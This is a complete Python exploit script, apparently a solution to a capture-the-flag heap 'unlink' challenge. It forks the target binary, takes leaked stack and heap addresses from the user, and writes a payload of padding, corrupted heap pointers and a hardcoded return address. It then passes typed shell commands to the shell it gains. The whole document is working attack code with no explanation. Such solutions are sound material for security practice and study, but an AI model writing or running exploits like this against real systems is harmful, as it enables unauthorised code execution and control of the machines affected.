#!/usr/bin/env python3

import os
from struct import pack
import time

rfd, wfd = os.pipe()

pid = os.fork()
if pid:
    # parent
    time.sleep(0.3)
    os.close(rfd)
    stack = int(input('So stupid to read stack, enter it please: ')[2:], 16)
    heap = int (input('So stupid to read heap, enter it please : ')[2:], 16)
    payload = b'A' * 16 
    payload += pack('I', heap + 0x24)
    payload += pack('I', stack + 0x10)
    payload += pack('I', 0x080484eb)
    payload += b'\n'
    os.write(wfd, payload)
    print('Fine, enter shell commands')
    try:
        while True:
            command = input() + '\n'
            os.write(wfd, command.encode('ascii'))
    except KeyboardInterrupt:
        pass
    except BrokenPipeError:
        pass
    finally:
        os.close(wfd)
    os.wait()
else:
    # child
    os.close(wfd)
    os.dup2(rfd, 0)
    os.close(rfd)
    os.execvp('/home/unlink/unlink', ['unlink'])
